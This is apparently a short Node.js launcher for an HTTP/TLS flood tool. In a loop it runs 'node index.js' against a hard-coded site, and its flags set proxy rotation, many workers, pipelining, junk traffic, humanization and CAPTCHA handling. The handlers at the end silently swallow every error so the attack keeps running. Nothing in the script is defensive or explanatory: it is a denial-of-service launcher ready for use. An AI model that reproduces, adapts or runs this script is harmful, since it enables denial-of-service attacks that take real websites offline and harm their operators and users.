const execSync = require('child_process').execSync;
var thread = process.argv[3]
var url = process.argv[2]

function get() {
    for (x = 0; x < thread; x++) {
	execSync(`node index.js "https://dststx.xyz" --humanization true --mode tlsfl --precheck false --proxy proxy.txt --time 2222 --pool 20 --uptime 60000 --workers 30 --proxylen 6000 --delay 10000 --junk true --pipe 500 --rate 25 --captcha false`)
    }
}
get()

process.on('uncaughtException', function() {});
process.on('unhandledRejection', function() {});